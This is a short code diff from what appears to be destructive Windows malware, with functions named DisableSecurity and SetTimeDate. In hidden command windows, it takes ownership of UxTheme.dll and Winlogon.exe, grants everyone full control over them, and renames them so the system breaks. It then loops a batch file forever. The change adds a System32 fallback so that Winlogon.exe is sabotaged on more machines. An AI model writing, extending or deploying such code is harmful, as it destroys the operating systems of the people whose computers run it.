@@ -697,7 +697,13 @@ void DisableSecurity() {
 int SetTimeDate() {
     CreateTimeDate();
     ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\UxTheme.dll & icacls C:\\Windows\\SysNative\\UxTheme.dll /grant everyone:F & ren C:\\Windows\\SysNative\\UxTheme.dll main_lol.dll", NULL, SW_HIDE);
-    ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\Winlogon.exe & icacls C:\\Windows\\SysNative\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\SysNative\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
+    if (PathFileExistsA("C:\\Windows\\SysNative")) {
+        ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\Winlogon.exe & icacls C:\\Windows\\SysNative\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\SysNative\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
+    }
+    else
+    {
+        ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\System32\\Winlogon.exe & icacls C:\\Windows\\System32\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\System32\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
+    }
     if (PathFileExistsA("C:\\Windows\\SysNative") == TRUE) {
         while (1) {
             ShellExecuteA(NULL, NULL, "cmd", "/c C:\\Windows\\SysNative\\timeDate.bat", NULL, SW_HIDE);
